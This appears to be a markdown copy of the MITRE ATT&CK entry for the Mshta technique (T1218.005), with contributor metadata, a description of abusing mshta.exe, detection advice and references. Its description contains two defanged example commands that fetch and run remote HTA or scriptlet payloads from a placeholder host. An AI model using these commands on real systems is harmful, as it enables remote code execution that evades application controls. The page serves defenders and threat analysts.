---
contributors:
- '@ionstorm'
- Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
- Ricardo Dias
data_sources:
- 'Process: Process Creation'
- 'File: File Creation'
- 'Command: Command Execution'
- 'Network Traffic: Network Connection Creation'
id: attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade
mitre_attack_url: https://attack.mitre.org/techniques/T1218/005
name: Mshta
platforms:
- Windows
tactics:
- defense-evasion
title: defense-evasion - Mshta
---

## Technical Details

| Attribute | Details |
|-----------|----------|
| **Tactics** | defense-evasion |
| **Platforms** | Windows |
| **Data Sources** | Process: Process Creation, File: File Creation, Command: Command Execution, Network Traffic: Network Connection Creation |
| **Permissions Required** | User |
| **MITRE ATT&CK URL** | [https://attack.mitre.org/techniques/T1218/005](https://attack.mitre.org/techniques/T1218/005) |

# Mshta (attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade)

## Description
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Detection
Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious

## External References
- [mitre-attack](https://attack.mitre.org/techniques/T1218/005)
- [Cylance Dust Storm](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)
- [Red Canary HTA Abuse Part Deux](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)
- [FireEye Attacks Leveraging HTA](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)
- [Airbus Security Kovter Analysis](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)
- [FireEye FIN7 April 2017](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)
- [Wikipedia HTML Application](https://en.wikipedia.org/wiki/HTML_Application)
- [MSDN HTML Applications](https://msdn.microsoft.com/library/ms536471.aspx)
- [LOLBAS Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
